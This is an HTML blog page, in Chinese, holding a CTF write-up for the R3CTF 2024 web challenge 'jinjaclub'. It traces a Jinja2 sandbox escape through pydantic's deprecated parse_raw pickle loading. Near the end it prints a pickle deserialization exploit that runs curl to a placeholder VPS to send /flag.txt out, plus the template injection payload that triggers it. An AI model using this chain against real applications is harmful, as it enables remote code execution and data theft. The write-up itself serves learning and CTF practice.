@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一个web手不看web看起取证来了（不会web），我为什么会做这样的梦 高贵的纯血web题 R3CTF是这样的，出题人只要留沙箱就可以了，而ctfer要考虑的事情就多了 呼，点进去一看发现名牌ssti还给了python源码 from jinja2.sandbox import SandboxedEn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="R3CTF 2024 web jinjaclub wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="一个web手不看web看起取证来了（不会web），我为什么会做这样的梦 高贵的纯血web题 R3CTF是这样的，出题人只要留沙箱就可以了，而ctfer要考虑的事情就多了 呼，点进去一看发现名牌ssti还给了python源码 from jinja2.sandbox import SandboxedEn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18243707/09.png">
+<meta property="article:published_time" content="2024-06-12T05:21:00.000Z">
+<meta property="article:modified_time" content="2024-06-12T05:21:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18243707/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>R3CTF 2024 web jinjaclub wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-06-16-vsctf-2024-re-awa-jelly-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-06-01-litctf-2024-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&text=R3CTF 2024 web jinjaclub wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&is_video=false&description=R3CTF 2024 web jinjaclub wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=R3CTF 2024 web jinjaclub wp&body=Check out this article: https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&name=R3CTF 2024 web jinjaclub wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&t=R3CTF 2024 web jinjaclub wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        R3CTF 2024 web jinjaclub wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-12T05:21:00.000Z" class="dt-published" itemprop="datePublished">2024-06-12</time>
+        
+        (Updated: <time datetime="2024-06-12T05:21:00.000Z" class="dt-updated" itemprop="dateModified">2024-06-12</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>一个web手不看web看起取证来了（不会web），我为什么会做这样的梦</p>
+<p>高贵的纯血web题</p>
+<blockquote>
+<p>R3CTF是这样的，出题人只要留沙箱就可以了，而ctfer要考虑的事情就多了</p>
+</blockquote>
+<p>呼，点进去一看发现名牌ssti还给了python源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from jinja2.sandbox import SandboxedEnvironment</span><br><span class="line">from jinja2.exceptions import UndefinedError</span><br><span class="line">from fastapi import FastAPI, Form</span><br><span class="line">from fastapi.responses import HTMLResponse</span><br><span class="line">from pydantic import BaseModel</span><br><span class="line">from typing_extensions import Annotated</span><br><span class="line">from typing import Union</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line">class User(BaseModel):</span><br><span class="line">    name: str</span><br><span class="line">    description: Union[str, None] = None</span><br><span class="line">    age: int</span><br><span class="line"></span><br><span class="line">class Template(BaseModel):</span><br><span class="line">    source: str</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/&quot;, response_class=HTMLResponse)</span><br><span class="line">def index():</span><br><span class="line">  return &#x27;TEST_OUTPUT&#x27;</span><br><span class="line">@app.get(&quot;/preview&quot;, response_class=HTMLResponse)</span><br><span class="line">def preview_page():</span><br><span class="line">    return &quot;&quot;&quot;</span><br><span class="line"> // SOME THING THERE</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Mailer Preview&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;Customize your ninja message:&lt;/p&gt;</span><br><span class="line">        &lt;form id=&quot;form&quot; onsubmit=&quot;handleSubmit(event);&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;name&quot;&gt;Name variable:&lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;name&quot; name=&quot;name&quot; value=&quot;John&quot; /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;label for=&quot;description&quot;&gt;Description variable:&lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;description&quot; name=&quot;description&quot; placeholder=&quot;Describe yourself here...&quot; /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;label for=&quot;age&quot;&gt;Age variable:&lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;age&quot; name=&quot;age&quot; type=&quot;number&quot; value=&quot;18&quot; /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;label for=&quot;template&quot;&gt;Template:&lt;/label&gt;</span><br><span class="line">            &lt;textarea id=&quot;template&quot; name=&quot;template&quot; rows=&quot;10&quot;&gt;Hello &#123;&#123;user.name&#125;&#125;, are you older than &#123;&#123;user.age&#125;&#125;?&lt;/textarea&gt;</span><br><span class="line">            </span><br><span class="line">            &lt;button type=&quot;submit&quot;&gt;Preview&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;div id=&quot;output&quot;&gt;Preview will appear here...&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function handleSubmit(event) &#123;</span><br><span class="line">            event.preventDefault();</span><br><span class="line">            const data = new FormData(event.target);</span><br><span class="line">            const body = &#123;user: &#123;&#125;, template: &#123;source: data.get(&#x27;template&#x27;)&#125;&#125;;</span><br><span class="line">            body.user.name = data.get(&#x27;name&#x27;);</span><br><span class="line">            body.user.description = data.get(&#x27;description&#x27;);</span><br><span class="line">            body.user.age = data.get(&#x27;age&#x27;);</span><br><span class="line">            </span><br><span class="line">            fetch(&#x27;/preview&#x27;, &#123;</span><br><span class="line">                method: &#x27;POST&#x27;, </span><br><span class="line">                headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;,</span><br><span class="line">                body: JSON.stringify(body)</span><br><span class="line">            &#125;)</span><br><span class="line">            .then(response =&gt; response.text())</span><br><span class="line">            .then(html =&gt; document.getElementById(&#x27;output&#x27;).innerHTML = html)</span><br><span class="line">            .catch(error =&gt; console.error(&#x27;Error:&#x27;, error));</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">// SOME THING THERE</span><br><span class="line">&quot;&quot;&quot; </span><br><span class="line">@app.post(&quot;/preview&quot;, response_class=HTMLResponse)</span><br><span class="line">def submit_preview(template: Template, user: User):</span><br><span class="line">    env = SandboxedEnvironment()</span><br><span class="line">    try:</span><br><span class="line">        preview = env.from_string(template.source).render(user=user)</span><br><span class="line">        return preview</span><br><span class="line">    except UndefinedError as e:</span><br><span class="line">        return e</span><br></pre></td></tr></table></figure>
+
+<p>我当时一看以为出题人善心大发送我这菜逼一题，然后我看到了这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env = SandboxedEnvironment()</span><br></pre></td></tr></table></figure>
+
+<p>想什么呢，出题的哪有这么善良（︶^︶）</p>
+<p>VSCODE里F12看SandboxedEnvironment()的defination，好嘛</p>
+<p><img src="/images/migrated/18243707/01.png"></p>
+<p>WHAT CAN I SAY! 下划线，mro 这些东西全寄了</p>
+<p>唔，那就看看有什么能用的吧。。。</p>
+<p>源文件第189行打断点，VSCODE ctrl+B 开工！</p>
+<p><img src="/images/migrated/18243707/02.png"></p>
+<p>发现User类，找到线索</p>
+<p><img src="/images/migrated/18243707/03.png"></p>
+<p>有json？有东西啊</p>
+<p>User里还有别的方法，截图截不过来了，这里给几个关键的</p>
+<p><img src="/images/migrated/18243707/04.png"></p>
+<p>看到parse系列，瞬间释怀</p>
+<p>对着BaseModel按F12，然后Ctrl+F，看看parse_file方法吧（￣︶￣）↗　</p>
+<p><img src="/images/migrated/18243707/05.png"></p>
+<p>抓到你啦，源文件第1179行</p>
+<p>allow_pickle？有点可疑，顺着往下看</p>
+<p><img src="/images/migrated/18243707/06.png"></p>
+<p>看起来这个是传文件（load file）。。。有没有直接传字符串的呢？</p>
+<p>回去看，欸，发现parse_raw，相关代码（就在parse_file上面）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">def parse_raw(  # noqa: D102</span><br><span class="line">    cls: type[Model],</span><br><span class="line">    b: str | bytes,</span><br><span class="line">    *,</span><br><span class="line">    content_type: str | None = None,</span><br><span class="line">    encoding: str = &#x27;utf8&#x27;,</span><br><span class="line">    proto: DeprecatedParseProtocol | None = None,</span><br><span class="line">    allow_pickle: bool = False,</span><br><span class="line">) -&gt; Model:  # pragma: no cover</span><br><span class="line">    warnings.warn(</span><br><span class="line">        &#x27;The `parse_raw` method is deprecated; if your data is JSON use `model_validate_json`, &#x27;</span><br><span class="line">        &#x27;otherwise load the data then use `model_validate` instead.&#x27;,</span><br><span class="line">        category=PydanticDeprecatedSince20,</span><br><span class="line">    )</span><br><span class="line">    from .deprecated import parse</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        obj = parse.load_str_bytes(</span><br><span class="line">            b,</span><br><span class="line">            proto=proto,</span><br><span class="line">            content_type=content_type,</span><br><span class="line">            encoding=encoding,</span><br><span class="line">            allow_pickle=allow_pickle,</span><br><span class="line">        )</span><br><span class="line">    except (ValueError, TypeError) as exc:</span><br><span class="line">        import json</span><br><span class="line"></span><br><span class="line">        # try to match V1</span><br><span class="line">        if isinstance(exc, UnicodeDecodeError):</span><br><span class="line">            type_str = &#x27;value_error.unicodedecode&#x27;</span><br><span class="line">        elif isinstance(exc, json.JSONDecodeError):</span><br><span class="line">            type_str = &#x27;value_error.jsondecode&#x27;</span><br><span class="line">        elif isinstance(exc, ValueError):</span><br><span class="line">            type_str = &#x27;value_error&#x27;</span><br><span class="line">        else:</span><br><span class="line">            type_str = &#x27;type_error&#x27;</span><br><span class="line"></span><br><span class="line">        # ctx is missing here, but since we&#x27;ve added `input` to the error, we&#x27;re not pretending it&#x27;s the same</span><br><span class="line">        error: pydantic_core.InitErrorDetails = &#123;</span><br><span class="line">            # The type: ignore on the next line is to ignore the requirement of LiteralString</span><br><span class="line">            &#x27;type&#x27;: pydantic_core.PydanticCustomError(type_str, str(exc)),  # type: ignore</span><br><span class="line">            &#x27;loc&#x27;: (&#x27;__root__&#x27;,),</span><br><span class="line">            &#x27;input&#x27;: b,</span><br><span class="line">        &#125;</span><br><span class="line">        raise pydantic_core.ValidationError.from_exception_data(cls.__name__, [error])</span><br><span class="line">    return cls.model_validate(obj)</span><br><span class="line"></span><br><span class="line">@classmethod</span><br><span class="line">@typing_extensions.deprecated(</span><br><span class="line">    &#x27;The `parse_file` method is deprecated; load the data from file, then if your data is JSON &#x27;</span><br><span class="line">    &#x27;use `model_validate_json`, otherwise `model_validate` instead.&#x27;,</span><br><span class="line">    category=None,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>找到目标，上链接！&gt;&gt;&gt; <a target="_blank" rel="noopener" href="https://docs.pydantic.dev/1.10/usage/models/#model-properties">开发手册</a></p>
+<p><img src="/images/migrated/18243707/07.png"></p>
+<p>HELPER FUNCTIONS接着看</p>
+<p><img src="/images/migrated/18243707/08.png"></p>
+<p>OHHHHH，这么大个警告哈哈哈哈哈哈哈哈这开发者真的很怕这里出问题</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pydantic/pydantic/blob/main/pydantic/deprecated/parse.py">github找源码</a>，找到对应位置</p>
+<p><img src="/images/migrated/18243707/09.png"></p>
+<p>发现满足proto&#x3D;”pickle”直接能pickle.loads()</p>
+<p>（这有点逆天了）</p>
+<p>getflag咯，典典典的pickle脚本~</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class User:</span><br><span class="line">    def __init__(self, username, password):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;curl YOUR VPS`cat /flag.txt|base64`&#x27;)&quot;,))</span><br><span class="line"></span><br><span class="line">user = User(&quot;HACKER&quot;, &quot;FLAG&quot;)</span><br><span class="line">print(pickle.dumps(user).hex())</span><br></pre></td></tr></table></figure>
+
+<p>结束！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">任意处：&#123;&#123;user.parse_raw(&quot;&quot;.encode(&quot;utf-8&quot;).fromhex(&quot;YOUR HEX&quot;), proto=&quot;pickle&quot;, allow_pickle=True)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个故事告诉我们：不要乱用意义不明的（尤其是被deprecated的）接口，攻击时着重看这些☆意义不明☆的接口没准能有收获</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&text=R3CTF 2024 web jinjaclub wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&is_video=false&description=R3CTF 2024 web jinjaclub wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=R3CTF 2024 web jinjaclub wp&body=Check out this article: https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&title=R3CTF 2024 web jinjaclub wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&name=R3CTF 2024 web jinjaclub wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-06-12-r3ctf-2024-web-jinjaclub-wp/&t=R3CTF 2024 web jinjaclub wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
